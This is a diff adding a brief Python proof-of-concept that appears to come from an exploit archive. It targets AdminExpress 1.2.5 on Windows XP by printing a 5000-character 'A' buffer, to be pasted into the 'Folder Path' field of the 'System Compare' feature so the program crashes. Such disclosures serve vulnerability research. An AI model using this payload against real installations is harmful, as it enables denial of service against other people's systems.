@@ -1,0 +1,21 @@
+# -*- coding: utf-8 -*-
+#!/usr/bin/python
+
+# Exploit Title: AdminExpress 1.2.5 - Denial of Service (PoC)
+# Date: 2019-04-12
+# Exploit Author: Mücahit İsmail Aktaş
+# Software Link: https://admin-express.en.softonic.com/
+# Version: 1.2.5.485
+# Tested on: Windows XP Professional SP2
+
+# Description:
+#
+# 1) Click the "System Compare" button
+# 2) Paste the payload in the "Folder Path" (left)
+# 3) Click the scales icon (in the middle, right side of "Folder Path")
+#
+
+
+buffer = "A" * 5000
+
+print("Payload: \n\n" + buffer + "\n")
